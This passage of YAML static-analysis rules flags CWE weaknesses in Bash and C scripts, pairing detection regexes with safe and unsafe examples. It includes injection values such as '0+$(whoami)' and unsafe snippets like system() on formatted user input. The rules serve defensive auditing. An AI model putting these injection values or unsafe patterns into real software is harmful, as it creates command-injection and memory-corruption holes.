message: 'CWE-91: XML generated with unescaped user input'
tags:
- security
- injection
- CWE-91
rule:
  kind: file_output
  pattern: '(echo\\s*[\"'']<.*\\$.*>|cat\\s*<<.*\\$.*</)

    '
note: 'XML special characters must be escaped to prevent injection.

  Safe: safe_username=$(echo "$username" | sed ''s/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g;
  s/"/\&quot;/g''); echo "<user>$safe_username</user>"

  Safe: xmlstarlet ed -s /root -t elem -n user -v "$username" data.xml

  Unsafe: echo "<user>$username</user>" >> data.xml

  '
---
id: bash-cwe-113-header-injection
language: bash
severity: warning
message: 'CWE-113: HTTP headers with user input can be injected'
tags:
- security
- injection
- CWE-113
rule:
  kind: command_call
  pattern: '(curl.*-H\\s+[\"''].*\\$|wget.*--header=[\"''].*\\$)

    '
note: 'HTTP headers must not contain newlines to prevent injection.

  Safe: if [[ "$username" =~ [\r\n] ]]; then echo "Invalid username" >&2; exit 1;
  fi; curl -H "X-User: $username" https://api.example.com

  Unsafe: curl -H "X-User: $username" https://api.example.com

  '
---
id: bash-cwe-400-regex-dos
language: bash
severity: info
message: 'CWE-400: Complex regex with user input can cause ReDoS'
tags:
- security
- denial-of-service
- CWE-400
rule:
  kind: command_call
  pattern: (grep\s+-[EP].*\$|=~.*\$)
note: 'Complex regex patterns can cause catastrophic backtracking.

  Safe: timeout 5 grep -P "$user_regex" file.txt

  Safe: Validate pattern length: if [ ${#user_pattern} -gt 100 ]; then echo "Pattern
  too long" >&2; exit 1; fi

  Unsafe: if [[ "$input" =~ $user_pattern ]]; then

  '
---
id: bash-cwe-059-symlink-attack
language: bash
severity: error
message: 'CWE-59: Following symlinks without verification can access unintended files'
tags:
- security
- race-condition
- CWE-59
rule:
  kind: file_operation
  pattern: (cat\s+\$|>\s*\$|>>\s*\$)
note: 'Symlinks can redirect file operations to unintended locations.

  Safe: if [ -L "$user_path" ]; then echo "Symlinks not allowed" >&2; exit 1; fi;
  cat "$user_path"

  Safe: real_path=$(realpath -- "$user_path"); case "$real_path" in /allowed/dir/*)
  cat "$real_path" ;; *) exit 1 ;; esac

  Unsafe: cat "$user_path"

  '
---
id: bash-cwe-367-race-condition-directory-creation
language: bash
severity: warning
message: 'CWE-367: Directory check then create has TOCTOU vulnerability'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: conditional
  pattern: (if\s+\[\s+!\s+-d.*\].*then.*mkdir|test\s+!\s+-d.*&&.*mkdir)
note: 'Directory can be created by attacker between check and create.

  Safe: mkdir -p "$dir" 2>/dev/null || { if [ ! -d "$dir" ]; then echo "Failed" >&2;
  exit 1; fi; }

  Unsafe: if [ ! -d "$dir" ]; then mkdir "$dir"; fi

  '
---
id: bash-cwe-078-command-substitution-in-array-index
language: bash
severity: error
message: 'CWE-78: Array subscript expressions are evaluated, enabling code execution'
tags:
- security
- code-injection
- CWE-78
rule:
  kind: array_access
  pattern: (\[\s*\$[^]]*\]|\$\{[a-zA-Z_][a-zA-Z0-9_]*\[\$)
note: 'Array indices are evaluated as arithmetic expressions.

  Safe: Validate index: if [[ ! "$index" =~ ^[0-9]+$ ]]; then echo "Invalid index"
  >&2; exit 1; fi; echo "${arr[$index]}"

  Unsafe: echo "${arr[$index]}" where index=$1 can be "0+$(whoami)"

  '
---
id: bash-cwe-078-unquoted-here-string
language: bash
severity: info
message: 'CWE-78: Here-strings without quotes expand variables and globs'
tags:
- security
- information-leak
- CWE-78
rule:
  kind: here_string
  pattern: <<<\s*\$
note: 'Here-string arguments should be quoted.

  Safe: grep pattern <<< "$data"

  Unsafe: grep pattern <<< $data

  '
---
id: bash-cwe-078-arithmetic-evaluation-injection
language: bash
severity: error
message: 'CWE-78: $(( )) and let evaluate expressions, enabling code injection'
tags:
- security
- code-injection
- CWE-78
rule:
  kind: arithmetic_expansion
  pattern: (\$\(\(.*\$|let\s+.*\$|\(\(.*\$)
note: 'Arithmetic expressions evaluate variable names and array indices.

  Safe: if [[ ! "$num" =~ ^-?[0-9]+$ ]]; then echo "Invalid number" >&2; exit 1; fi;
  result=$(( num + 1 ))

  Unsafe: result=$(( $1 + 1 )) where $1 could be "a[$(whoami)]"

  '
---
id: bash-cwe-426-insecure-shebang
language: bash
severity: warning
message: 'CWE-426: Using env in shebang can execute different interpreter from PATH'
tags:
- security
- code-execution
- CWE-426
rule:
  kind: shebang_line
  pattern: ^#!/usr/bin/env\s+
note: 'env shebang searches PATH, which can be manipulated.

  Safe: #!/bin/bash (absolute path)

  Safe: #!/usr/bin/env -S PATH=/bin:/usr/bin bash

  Unsafe: #!/usr/bin/env bash

  '
---
id: bash-cwe-200-exposed-pid-file
language: bash
severity: info
message: 'CWE-200: PID files in world-readable locations expose process info'
tags:
- security
- information-exposure
- CWE-200
rule:
  kind: file_output
  pattern: (echo\s+\$\$\s*>\s*/tmp/|echo\s+\$\$\s*>\s*/var/run/.*(?!\.pid))
note: 'PID files should not be world-readable.

  Safe: echo $$ > /var/run/myapp.pid; chmod 600 /var/run/myapp.pid

  Unsafe: echo $$ > /tmp/myapp.pid

  '
---
id: bash-cwe-330-weak-random-number
language: bash
severity: warning
message: 'CWE-330: $RANDOM is not cryptographically secure'
tags:
- security
- cryptography
- CWE-330
rule:
  kind: variable_usage
  pattern: \$RANDOM
note: '$RANDOM is predictable and not suitable for security purposes.

  Safe: token=$(head -c 32 /dev/urandom | base64)

  Safe: password=$(openssl rand -base64 32)

  Unsafe: token=$RANDOM$RANDOM

  Unsafe: password=$(echo $RANDOM | md5sum)

  '
---
id: bash-cwe-312-unencrypted-data-storage
language: bash
severity: warning
message: 'CWE-312: Sensitive data written to files without encryption'
tags:
- security
- data-protection
- CWE-312
rule:
  kind: file_output
  pattern: (echo.*password.*>|echo.*secret.*>|echo.*key.*>)
note: 'Sensitive data should be encrypted before storage.

  Safe: echo "$password" | openssl enc -aes-256-cbc -pbkdf2 -out /etc/myapp/password.enc

  Safe: vault write secret/myapp password="$password"

  Unsafe: echo "$password" > /etc/myapp/password.txt

  '
---
id: bash-cwe-250-missing-restricted-shell
language: bash
severity: info
message: 'CWE-250: Scripts for restricted users should use restricted shell'
tags:
- security
- privilege-restriction
- CWE-250
rule:
  kind: shebang_line
  pattern: ^#!/bin/bash\s*$
note: 'Restricted user shells should use rbash or restricted mode.

  Safe: #!/bin/rbash

  Safe: #!/bin/bash -r; set -r

  For restricted user shells only (not general purpose scripts)

  '
---
id: c-cwe-120-unsafe-strcpy
language: c
severity: error
message: 'CWE-120: Buffer Copy without Checking Size of Input - strcpy'
tags:
- security
- buffer-overflow
- CWE-120
- OWASP-A4
rule:
  kind: function_call
  pattern: strcpy($DEST, $SRC)
note: 'strcpy copies data without bounds checking, leading to buffer overflows when

  source exceeds destination size. This is one of the most dangerous functions

  in C.


  Remediation: Use strncpy with explicit size, strlcpy, or strcpy_s.

  Bad:  char buf[10]; strcpy(buf, user_input);

  Good: char buf[10]; strncpy(buf, user_input, sizeof(buf)-1); buf[sizeof(buf)-1]
  = ''\0'';

  '
---
id: c-cwe-120-unsafe-strcat
language: c
severity: error
message: 'CWE-120: Buffer Copy without Checking Size of Input - strcat'
tags:
- security
- buffer-overflow
- CWE-120
- OWASP-A4
rule:
  kind: function_call
  pattern: strcat($DEST, $SRC)
note: 'strcat appends data without checking remaining buffer space, leading to

  buffer overflow vulnerabilities.


  Remediation: Use strncat, strlcat, or strcat_s with explicit size.

  Bad:  char buf[20] = "Hello"; strcat(buf, very_long_string);

  Good: strncat(buf, src, sizeof(buf) - strlen(buf) - 1);

  '
---
id: c-cwe-120-unsafe-sprintf
language: c
severity: error
message: 'CWE-120, CWE-134: Unsafe sprintf without bounds checking'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-134
- OWASP-A4
rule:
  kind: function_call
  pattern: sprintf($BUF, $FMT, ...)
note: 'sprintf has no length checking and can overflow buffers when format string

  or arguments are not properly bounded.


  Remediation: Use snprintf with explicit buffer size.

  Bad:  sprintf(buf, "Name: %s", name);

  Good: snprintf(buf, sizeof(buf), "Name: %s", name);

  '
---
id: c-cwe-120-banned-gets
language: c
severity: error
message: 'CWE-120, CWE-242: Banned gets function with no bounds checking'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-242
- OWASP-A4
rule:
  kind: function_call
  pattern: gets($BUF)
note: 'gets is inherently unsafe and has been removed from C11 standard. No bounds

  checking whatsoever. This function must never be used.


  Remediation: Use fgets with explicit buffer size.

  Bad:  gets(buffer);

  Good: fgets(buffer, sizeof(buffer), stdin);

  '
---
id: c-cwe-120-unsafe-vsprintf
language: c
severity: error
message: 'CWE-120: Unsafe vsprintf without bounds checking'
tags:
- security
- buffer-overflow
- CWE-120
- OWASP-A4
rule:
  kind: function_call
  pattern: vsprintf($BUF, $FMT, $ARGS)
note: 'Variable argument sprintf without bounds checking. Can overflow buffers.


  Remediation: Use vsnprintf with explicit buffer size.

  Bad:  vsprintf(buf, fmt, args);

  Good: vsnprintf(buf, sizeof(buf), fmt, args);

  '
---
id: c-cwe-120-unsafe-wcscpy
language: c
severity: error
message: 'CWE-120: Unsafe wcscpy without bounds checking'
tags:
- security
- buffer-overflow
- CWE-120
- OWASP-A4
rule:
  kind: function_call
  pattern: wcscpy($DEST, $SRC)
note: 'Wide character version of strcpy with identical buffer overflow vulnerabilities.


  Remediation: Use wcsncpy or wcscpy_s.

  '
---
id: c-cwe-120-unsafe-wcscat
language: c
severity: error
message: 'CWE-120: Unsafe wcscat without bounds checking'
tags:
- security
- buffer-overflow
- CWE-120
- OWASP-A4
rule:
  kind: function_call
  pattern: wcscat($DEST, $SRC)
note: 'Wide character strcat without bounds checking. Same vulnerabilities as strcat.


  Remediation: Use wcsncat or wcscat_s.

  '
---
id: c-cwe-120-unsafe-memcpy-user-size
language: c
severity: warning
message: 'CWE-120, CWE-805: memcpy with user-controlled size parameter'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-805
rule:
  kind: function_call
  pattern: memcpy($DEST, $SRC, $USER_SIZE)
note: 'When size parameter comes from user input without validation, can lead to

  buffer overflow. Size must be validated against destination buffer capacity.


  Remediation: Validate size against destination buffer capacity before copying.

  '
---
id: c-cwe-120-unsafe-memmove-user-size
language: c
severity: warning
message: 'CWE-120, CWE-805: memmove with user-controlled size parameter'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-805
rule:
  kind: function_call
  pattern: memmove($DEST, $SRC, $USER_SIZE)
note: 'Same as memcpy but for overlapping buffers. User-controlled size without

  validation is exploitable.


  Remediation: Validate size parameter before calling memmove.

  '
---
id: c-cwe-120-scanf-no-width
language: c
severity: warning
message: 'CWE-120, CWE-134: scanf without width specifier'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-134
rule:
  kind: function_call
  pattern: scanf("%s", $BUF)
note: 'Using %s without width limit in scanf causes buffer overflow. Format string

  must specify maximum length.


  Remediation: Use width specifier: scanf("%99s", buf) for 100-byte buffer.

  Bad:  scanf("%s", buffer);

  Good: scanf("%99s", buffer);

  '
---
id: c-cwe-120-fscanf-no-width
language: c
severity: warning
message: 'CWE-120: fscanf without width specifier'
tags:
- security
- buffer-overflow
- CWE-120
rule:
  kind: function_call
  pattern: fscanf($FILE, "%s", $BUF)
note: 'File scanf without width specifier is equivalent to scanf vulnerability.


  Remediation: Add width specifier to format string.

  '
---
id: c-cwe-120-sscanf-no-width
language: c
severity: warning
message: 'CWE-120: sscanf without width specifier'
tags:
- security
- buffer-overflow
- CWE-120
rule:
  kind: function_call
  pattern: sscanf($STR, "%s", $BUF)
note: 'String scanf without width specifier causes buffer overflow from string source.


  Remediation: Add width specifier to format string.

  '
---
id: c-cwe-120-realpath-overflow
language: c
severity: warning
message: 'CWE-120, CWE-785: realpath buffer overflow'
tags:
- security
- buffer-overflow
- CWE-120
- CWE-785
rule:
  kind: function_call
  pattern: realpath($PATH, $BUF)
note: 'If buffer is not PATH_MAX bytes, overflow can occur. realpath requires

  careful buffer management.


  Remediation: Use NULL as second argument (returns allocated string) or

  ensure buffer is PATH_MAX bytes.

  '
---
id: c-cwe-120-getwd-deprecated
language: c
severity: warning
message: 'CWE-120: getwd deprecated function with overflow risk'
tags:
- security
- buffer-overflow
- CWE-120
rule:
  kind: function_call
  pattern: getwd($BUF)
note: 'Deprecated function that may overflow buffer if path is longer than expected.


  Remediation: Use getcwd with explicit size parameter.

  '
---
id: c-cwe-134-printf-format-string
language: c
severity: error
message: 'CWE-134: Printf format string vulnerability'
tags:
- security
- format-string
- CWE-134
- OWASP-A4
rule:
  kind: function_call
  pattern: printf($USER_INPUT)
note: 'User-controlled format string allows arbitrary memory read/write attacks.

  Attacker can use %x, %n specifiers to read stack or write to memory.


  Remediation: Use printf("%s", user_input) or puts(user_input).

  Bad:  printf(user_input);

  Good: printf("%s", user_input);

  '
---
id: c-cwe-134-fprintf-format-string
language: c
severity: error
message: 'CWE-134: fprintf format string vulnerability'
tags:
- security
- format-string
- CWE-134
- OWASP-A4
rule:
  kind: function_call
  pattern: fprintf($FILE, $USER_INPUT)
note: 'Format string vulnerability in file output. Same risks as printf.


  Remediation: Use fprintf(file, "%s", user_input).

  '
---
id: c-cwe-134-sprintf-format-string
language: c
severity: error
message: 'CWE-134: sprintf format string vulnerability'
tags:
- security
- format-string
- CWE-134
- OWASP-A4
rule:
  kind: function_call
  pattern: sprintf($BUF, $USER_INPUT)
note: 'Format string in sprintf. Can overflow buffer and read/write memory.


  Remediation: Use sprintf(buf, "%s", user_input).

  '
---
id: c-cwe-134-syslog-format-string
language: c
severity: error
message: 'CWE-134: syslog format string vulnerability'
tags:
- security
- format-string
- CWE-134
rule:
  kind: function_call
  pattern: syslog($PRIORITY, $USER_INPUT)
note: 'Syslog with user-controlled format string can leak information or write memory.


  Remediation: Use syslog(priority, "%s", user_input).

  '
---
id: c-cwe-134-snprintf-non-literal-format
language: c
severity: warning
message: 'CWE-134: snprintf with non-literal format string'
tags:
- security
- format-string
- CWE-134
rule:
  kind: function_call
  pattern: snprintf($BUF, $SIZE, $VAR)
note: 'Even bounded printf can leak information via format string specifiers.

  Non-literal format strings are dangerous regardless of bounds.


  Remediation: Always use literal format string as third parameter.

  '
---
id: c-cwe-134-err-warn-format-string
language: c
severity: warning
message: 'CWE-134: err/warn family format string vulnerability'
tags:
- security
- format-string
- CWE-134
rule:
  kind: function_call
  pattern: err($EXIT, $USER_INPUT) | warn($USER_INPUT)
note: 'BSD error functions with user-controlled format string. Same vulnerabilities

  as printf and syslog.


  Remediation: Use err(1, "%s", msg) or warn("%s", msg).

  '
---
id: c-cwe-190-integer-overflow-allocation
language: c
severity: error
message: 'CWE-190: Integer overflow in memory allocation size'
tags:
- security
- integer-overflow
- CWE-190
- OWASP-A4
rule:
  kind: function_call
  pattern: malloc($COUNT * $SIZE)
note: 'Multiplication can wrap around, allocating much less memory than expected.

  For example: malloc(0x10000000 * 0x10000000) may allocate only a few bytes

  due to overflow.


  Remediation: Use calloc(count, sizeof(int)), or check for overflow:

  if (count > SIZE_MAX/sizeof(int)) return NULL;

  '
---
id: c-cwe-190-integer-overflow-array-index
language: c
severity: warning
message: 'CWE-190, CWE-129: Integer overflow in array index'
tags:
- security
- integer-overflow
- CWE-190
- CWE-129
rule:
  kind: array_access
  pattern: $ARR[$USER_INT + $OFFSET]
note: 'User-controlled integer plus offset can overflow to negative index, causing

  out-of-bounds access.


  Remediation: Validate bounds before use, use size_t for array indices.

  '
---
id: c-cwe-190-signed-integer-overflow
language: c
severity: warning
message: 'CWE-190: Signed integer overflow (undefined behavior)'
tags:
- security
- integer-overflow
- CWE-190
rule:
  kind: expression
  pattern: Signed integer arithmetic without bounds checking
note: 'Signed overflow is undefined behavior in C/C++. May cause unexpected behavior,

  crashes, or security vulnerabilities.


  Remediation: Check for overflow before operation or use unsigned types.

  '
---
id: c-cwe-191-integer-underflow
language: c
severity: warning
message: 'CWE-191: Integer underflow'
tags:
- security
- integer-overflow
- CWE-191
rule:
  kind: expression
  pattern: $SIZE - $USER_VAL
note: 'Subtracting from unsigned integer without check can wrap to large positive
  value.

  For example: 5u - 10 = 4294967291u (on 32-bit).


  Remediation: Check that subtrahend <= minuend before operation.

  '
---
id: c-cwe-197-integer-truncation
language: c
severity: medium
message: 'CWE-197: Numeric truncation error'
tags:
- security
- integer-overflow
- CWE-197
rule:
  kind: cast
  pattern: (short)$LONG_VAL | (char)$INT_VAL
note: 'Casting to smaller type loses high-order bits. For example:

  short x = (short)0x10001; // x = 1


  Remediation: Validate value fits in target type before cast.

  '
---
id: c-cwe-681-size-t-int-conversion
language: c
severity: medium
message: 'CWE-681: Incorrect conversion from size_t to int'
tags:
- security
- integer-overflow
- CWE-681
rule:
  kind: assignment
  pattern: int $VAR = strlen($STR)
note: 'strlen returns size_t, assigning to int can truncate or become negative on

  large strings. An int can be signed which leads to issues.


  Remediation: Use size_t for string lengths.

  '
---
id: c-cwe-415-double-free
language: c
severity: error
message: 'CWE-415: Double free'
tags:
- security
- memory-safety
- CWE-415
- OWASP-A4
rule:
  kind: function_call
  pattern: Multiple free($PTR) calls on same pointer
note: 'Double free corrupts heap metadata and is exploitable for arbitrary code

  execution.


  Remediation: Set pointer to NULL after free, check for NULL before free.

  '
---
id: c-cwe-401-memory-leak
language: c
severity: medium
message: 'CWE-401: Memory leak - malloc without matching free'
tags:
- security
- memory-safety
- CWE-401
rule:
  kind: function_call
  pattern: malloc without corresponding free in all paths
note: 'Memory not freed in all code paths leads to resource exhaustion and

  denial of service.


  Remediation: Ensure every allocation path has corresponding deallocation.

  Use resource acquisition is initialization (RAII) in C++.

  '
---
id: c-cwe-590-free-stack-memory
language: c
severity: error
message: 'CWE-590: Free of memory not on the heap - stack memory'
tags:
- security
- memory-safety
- CWE-590
- OWASP-A4
rule:
  kind: function_call
  pattern: free(&$LOCAL_VAR)
note: 'Freeing stack memory corrupts heap metadata and is critical.


  Remediation: Only free dynamically allocated memory from malloc/calloc/realloc.

  '
---
id: c-cwe-590-free-static-memory
language: c
severity: error
message: 'CWE-590: Free of memory not on the heap - static memory'
tags:
- security
- memory-safety
- CWE-590
- OWASP-A4
rule:
  kind: function_call
  pattern: free($STATIC_PTR)
note: 'Freeing static or global memory corrupts heap. Same severity as freeing stack.


  Remediation: Only free heap memory.

  '
---
id: c-cwe-252-unchecked-malloc-return
language: c
severity: warning
message: 'CWE-252, CWE-690: Unchecked malloc return value'
tags:
- security
- memory-safety
- CWE-252
- CWE-690
rule:
  kind: function_call
  pattern: $PTR = malloc($SIZE); $PTR->$FIELD without NULL check
note: 'malloc can return NULL when memory allocation fails. Dereferencing NULL

  causes immediate crash (may be exploitable).


  Remediation: Always check malloc return value.

  Bad:  char *p = malloc(100); strcpy(p, src);

  Good: char *p = malloc(100); if (!p) return NULL; strcpy(p, src);

  '
---
id: c-cwe-252-unchecked-calloc-return
language: c
severity: warning
message: 'CWE-252, CWE-690: Unchecked calloc return value'
tags:
- security
- memory-safety
- CWE-252
- CWE-690
rule:
  kind: function_call
  pattern: calloc($N, $SIZE) without NULL check
note: 'calloc can also fail and return NULL.


  Remediation: Always check return value before using.

  '
---
id: c-cwe-252-unchecked-realloc-return
language: c
severity: warning
message: 'CWE-252, CWE-401: Unchecked realloc return value'
tags:
- security
- memory-safety
- CWE-252
- CWE-401
rule:
  kind: function_call
  pattern: $PTR = realloc($PTR, $SIZE)
note: 'If realloc fails, it returns NULL but original pointer is lost, causing

  memory leak in addition to allocation failure.


  Remediation: Use temporary pointer: tmp = realloc(ptr, size); if (tmp) ptr = tmp;

  '
---
id: c-cwe-122-heap-buffer-overflow
language: c
severity: error
message: 'CWE-122: Heap-based buffer overflow'
tags:
- security
- buffer-overflow
- CWE-122
- OWASP-A4
rule:
  kind: expression
  pattern: Write beyond allocated heap size
note: 'Writing past allocated buffer corrupts heap metadata and adjacent objects.

  Highly exploitable for arbitrary code execution.


  Remediation: Track allocation size, validate all writes, use bounds checking.

  '
---
id: c-cwe-121-stack-buffer-overflow
language: c
severity: error
message: 'CWE-121: Stack-based buffer overflow'
tags:
- security
- buffer-overflow
- CWE-121
- OWASP-A4
rule:
  kind: expression
  pattern: Write beyond stack array bounds
note: 'Can overwrite return address for direct code execution. One of the most

  exploitable vulnerabilities.


  Remediation: Use bounds-checking functions, enable stack canaries.

  '
---
id: c-cwe-762-mismatched-alloc-dealloc
language: c
severity: warning
message: 'CWE-762: Mismatched memory management routines'
tags:
- security
- memory-safety
- CWE-762
rule:
  kind: function_call
  pattern: new with free OR malloc with delete
note: 'Mixing allocators (malloc/free vs new/delete) causes undefined behavior

  and heap corruption.


  Remediation: Match: malloc/free, new/delete, new[]/delete[].

  '
---
id: c-cwe-762-delete-vs-delete-array
language: c
severity: warning
message: 'CWE-762: Using delete instead of delete[] for arrays'
tags:
- security
- memory-safety
- CWE-762
rule:
  kind: function_call
  pattern: new $TYPE[$SIZE] followed by delete $PTR (not delete[])
note: 'Using delete instead of delete[] for arrays causes heap corruption because

  delete doesn''t call destructors for all elements.


  Remediation: Use delete[] for array-allocated pointers.

  '
---
id: c-cwe-476-null-pointer-dereference
language: c
severity: warning
message: 'CWE-476: NULL pointer dereference'
tags:
- security
- null-pointer
- CWE-476
rule:
  kind: expression
  pattern: Dereference of potentially NULL pointer
note: 'Dereferencing NULL causes crash, may be exploitable in some contexts.


  Remediation: Always check for NULL before dereference.

  '
---
id: c-cwe-476-null-check-after-deref
language: c
severity: warning
message: 'CWE-476: NULL check after dereference (too late)'
tags:
- security
- null-pointer
- CWE-476
rule:
  kind: expression
  pattern: $PTR->$FIELD; if ($PTR == NULL)
note: 'Null check comes after use, defeating the safety check.


  Remediation: Check before dereference.

  '
---
id: c-cwe-476-null-return-unchecked
language: c
severity: medium
message: 'CWE-476, CWE-252: Unchecked NULL return from function'
tags:
- security
- null-pointer
- CWE-476
- CWE-252
rule:
  kind: function_call
  pattern: fopen/malloc/etc returning NULL used without check
note: 'Many C library functions return NULL on failure: fopen, malloc, strdup, etc.


  Remediation: Always check return values for NULL.

  '
---
id: c-cwe-367-toctou-race
language: c
severity: warning
message: 'CWE-367: Time-of-check time-of-use race condition'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: function_call
  pattern: access($PATH, $MODE) followed by open($PATH, ...)
note: 'File state can change between check and use. Attacker can replace file

  with symlink or modify permissions.


  Remediation: Use file descriptors and fstat instead of stat+access.

  Bad:  if (access(file, W_OK) == 0) { fp = fopen(file, "w"); }

  Good: fd = open(file, O_WRONLY); if (fd >= 0) { ... }

  '
---
id: c-cwe-364-signal-handler-race
language: c
severity: warning
message: 'CWE-364, CWE-479: Signal handler race condition'
tags:
- security
- race-condition
- CWE-364
- CWE-479
rule:
  kind: function_call
  pattern: Non-async-safe function in signal handler
note: 'Signal can interrupt non-reentrant code causing data corruption and

  race conditions.


  Remediation: Only use async-signal-safe functions in handlers (signal safe list).

  '
---
id: c-cwe-362-unprotected-shared-variable
language: c
severity: medium
message: 'CWE-362: Concurrent execution using shared resource without synchronization'
tags:
- security
- race-condition
- CWE-362
rule:
  kind: expression
  pattern: Global variable accessed from multiple threads without mutex
note: 'Data races cause undefined behavior and can lead to exploitable conditions.


  Remediation: Use mutex, atomic operations, or thread-local storage.

  '
---
id: c-cwe-367-stat-fopen-race
language: c
severity: warning
message: 'CWE-367: TOCTOU race between stat and fopen'
tags:
- security
- race-condition
- CWE-367
rule:
  kind: function_call
  pattern: stat($PATH, ...) followed by fopen($PATH, ...)
note: 'File can be changed between stat and open. Use open then fstat instead.


  Remediation: Open first, then fstat on the file descriptor.

  '
---
id: c-cwe-457-uninitialized-local-variable
language: c
severity: warning
message: 'CWE-457: Use of uninitialized local variable'
tags:
- security
- uninitialized
- CWE-457
rule:
  kind: expression
  pattern: Local variable used before initialization
note: 'Contains stack garbage, can leak sensitive data or cause crashes.


  Remediation: Initialize all variables at declaration.

  '
---
id: c-cwe-457-uninitialized-struct-member
language: c
severity: medium
message: 'CWE-457: Uninitialized structure member'
tags:
- security
- uninitialized
- CWE-457
rule:
  kind: expression
  pattern: Struct with uninitialized fields
note: 'Padding or unset fields contain garbage values, can leak information.


  Remediation: Use = {0} or memset to zero-initialize.

  '
---
id: c-cwe-457-partial-array-init
language: c
severity: medium
message: 'CWE-457: Partial array initialization'
tags:
- security
- uninitialized
- CWE-457
rule:
  kind: expression
  pattern: Array initializer with fewer elements than array size
note: 'Remaining elements are zero in C, but unclear intent may hide bugs.


  Remediation: Fully initialize or explicitly use = {0}.

  '
---
id: c-cwe-457-uninitialized-pointer
language: c
severity: error
message: 'CWE-457, CWE-824: Uninitialized pointer'
tags:
- security
- uninitialized
- CWE-457
- CWE-824
rule:
  kind: expression
  pattern: Pointer declared without initialization, then dereferenced
note: 'Wild pointer points to random memory, dereferencing causes crash or

  arbitrary memory access.


  Remediation: Initialize to NULL or valid address.

  '
---
id: c-cwe-78-system-command-injection
language: c
severity: error
message: 'CWE-78: OS command injection'
tags:
- security
- command-injection
- CWE-78
- OWASP-A3
rule:
  kind: function_call
  pattern: system($USER_INPUT)
note: 'User input in shell command allows arbitrary command execution. system()

  runs command through /bin/sh.


  Remediation: Use exec family with explicit arguments, avoid shell entirely.

  Bad:  char cmd[256]; sprintf(cmd, "ls %s", user_dir); system(cmd);

  Good: execlp("ls", "ls", user_dir, NULL);

  '
---
id: c-cwe-78-popen-command-injection
language: c
severity: error
message: 'CWE-78: OS command injection via popen'
tags:
- security
- command-injection
- CWE-78
- OWASP-A3
rule:
  kind: function_call
  pattern: popen($USER_INPUT, $MODE)
note: 'popen runs command through shell, same injection vulnerability as system().


  Remediation: Use pipe/fork/exec directly instead of popen.

  '
---
id: c-cwe-78-exec-with-shell
language: c
severity: warning
message: 'CWE-78: Exec with shell executing user command'
tags:
- security
- command-injection
- CWE-78
- OWASP-A3
rule:
  kind: function_call
  pattern: execl("/bin/sh", "sh", "-c", $USER_INPUT, ...)
note: 'Executing shell with user command. Better to use execv with parsed arguments.


  Remediation: Parse and validate command, use execv with explicit argument array.

  '
---
id: c-cwe-78-wordexp-shell-expansion
language: c
severity: warning
message: 'CWE-78: wordexp shell expansion with user input'
tags:
- security
- command-injection
- CWE-78
- OWASP-A3
rule:
  kind: function_call
  pattern: wordexp($USER_INPUT, ...)
note: 'wordexp performs shell expansion including command substitution $(cmd).

  Can lead to command injection.


  Remediation: Use WRDE_NOCMD flag to disable command substitution.

  '
---
id: c-cwe-22-path-traversal
language: c
severity: warning
message: 'CWE-22: Path traversal'
tags:
- security
- path-traversal
- CWE-22
- OWASP-A1
rule:
  kind: function_call
  pattern: open($USER_PATH, ...) OR fopen($USER_PATH, ...)
note: "\"../\" sequences can access files outside intended directory. Attacker\ncan\
  \ read/write arbitrary files if path is not validated.\n\nRemediation: Canonicalize\
  \ path, verify it starts with allowed prefix.\nGood: char *real = realpath(user_filename,\
  \ NULL);\n      if (strncmp(real, \"/safe/\", 6) == 0) ...\n"
---
id: c-cwe-59-symlink-following
language: c
severity: medium
message: 'CWE-59: Improper link resolution'
tags:
- security
- path-traversal
- CWE-59
rule:
  kind: function_call
  pattern: File operations that follow symlinks in user paths
note: 'Attacker can create symlink pointing to sensitive file. fopen follows

  symlinks by default.


  Remediation: Use O_NOFOLLOW flag, lstat instead of stat.

  '
---
id: c-cwe-243-chroot-escape
language: c
severity: warning
message: 'CWE-243: Chroot escape'
tags:
- security
- path-traversal
- CWE-243
rule:
  kind: function_call
  pattern: chroot($PATH) without chdir("/")
note: 'Process can escape chroot via relative paths if current working directory

  is outside chroot.


  Remediation: Always chdir("/") immediately after chroot.

  '
---
id: c-cwe-321-hardcoded-crypto-key
language: c
severity: error
message: 'CWE-321: Use of hard-coded cryptographic key'
tags:
- security
- cryptography
- CWE-321
- OWASP-A2
rule:
  kind: variable_declaration
  pattern: const char *key = "..." used with crypto functions
note: 'Cryptographic keys in source code can be extracted via reverse engineering.


  Remediation: Use key derivation (KDF), key management systems, or load from

  secure configuration.

  '
---
id: c-cwe-330-weak-random
language: c
severity: warning
message: 'CWE-330: Use of insufficiently random values'
tags:
- security
- cryptography
- CWE-330
rule:
  kind: function_call
  pattern: rand() OR random() for security purposes
note: 'rand() and random() are predictable pseudorandom generators not suitable

  for security.


  Remediation: Use arc4random, getrandom, /dev/urandom, or crypto library RNG.

  '
---
id: c-cwe-330-predictable-seed
language: c
severity: warning
message: 'CWE-330, CWE-337: Predictable seed for random number generator'
tags:
- security
- cryptography
- CWE-330
- CWE-337
rule:
  kind: function_call
  pattern: srand(time(NULL))
note: 'time() is very predictable seed. Attacker can predict sequence of random numbers.


  Remediation: Use cryptographic random number generator.

  '
---
id: c-cwe-328-md5-hash
language: c
severity: warning
message: 'CWE-328: Reversible one-way hash - MD5'
tags:
- security
- cryptography
- CWE-328
rule:
  kind: function_call
  pattern: MD5_Init OR MD5_Update OR MD5_Final
note: 'MD5 is cryptographically broken. Collision attacks exist. Must not be used

  for security purposes.


  Remediation: Use SHA-256 or stronger (SHA-3).

  '
---
id: c-cwe-328-sha1-hash
language: c
severity: medium
message: 'CWE-328: Reversible one-way hash - SHA-1'
tags:
- security
- cryptography
- CWE-328
rule:
  kind: function_call
  pattern: SHA1_Init OR SHA1_Update OR SHA1_Final
note: 'SHA-1 has practical collision attacks. Should not be used for new applications.


  Remediation: Use SHA-256 or SHA-3 for new code.

  '
---
id: c-cwe-327-des-encryption
language: c
severity: warning
message: 'CWE-327: Use of broken algorithm - DES'
tags:
- security
- cryptography
- CWE-327
rule:
  kind: function_call
  pattern: DES_* functions
note: 'DES has only 56-bit key, easily brute-forced with modern hardware.


  Remediation: Use AES-256 or stronger cipher.

  '
---
id: c-cwe-327-ecb-mode
language: c
severity: medium
message: 'CWE-327: Use of broken algorithm - ECB mode'
tags:
- security
- cryptography
- CWE-327
